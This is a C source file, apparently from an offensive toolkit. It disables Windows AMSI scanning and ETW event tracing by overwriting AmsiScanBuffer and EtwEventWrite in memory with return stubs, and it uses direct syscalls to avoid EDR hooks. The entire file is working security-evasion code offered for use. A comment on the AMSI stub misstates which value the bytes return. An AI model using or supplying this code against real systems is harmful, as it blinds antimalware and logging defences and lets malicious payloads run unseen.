/*
 * bypass.c — AMSI and ETW in-process patches using direct syscalls
 */
#include "bypass.h"
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

// Direct syscall wrappers (from direct_syscall.c)
extern NTSTATUS Syscall_NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

/* ret 0 stub — 3 bytes: XOR EAX,EAX ; RET */
static const uint8_t STUB_RET0[]  = { 0x33, 0xC0, 0xC3 };

/* ret AMSI_RESULT_NOT_DETECTED (1) stub — MOV EAX,1 ; RET */
static const uint8_t STUB_AMSI[]  = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

static BOOL patch_proc(const char *dll, const char *proc,
                       const uint8_t *stub, size_t stub_len) {
    HMODULE h = GetModuleHandleA(dll);
    if (!h) h = LoadLibraryA(dll);
    if (!h) return FALSE;

    LPVOID fn = (LPVOID)GetProcAddress(h, proc);
    if (!fn) return FALSE;

    // Use direct syscall to bypass EDR hooks on VirtualProtect
    DWORD old_prot = 0;
    PVOID pBase = fn;
    SIZE_T regionSize = stub_len;
    
    NTSTATUS status = Syscall_NtProtectVirtualMemory(
        GetCurrentProcess(),
        &pBase,
        &regionSize,
        PAGE_EXECUTE_READWRITE,
        &old_prot
    );

    if (status != 0) return FALSE;

    memcpy(fn, stub, stub_len);
    FlushInstructionCache(GetCurrentProcess(), fn, stub_len);

    Syscall_NtProtectVirtualMemory(
        GetCurrentProcess(),
        &pBase,
        &regionSize,
        old_prot,
        &old_prot
    );
    
    return TRUE;
}

BOOL bypass_amsi(void) {
    return patch_proc("amsi.dll", "AmsiScanBuffer", STUB_AMSI, sizeof(STUB_AMSI));
}

BOOL bypass_etw(void) {
    return patch_proc("ntdll.dll", "EtwEventWrite", STUB_RET0, sizeof(STUB_RET0));
}
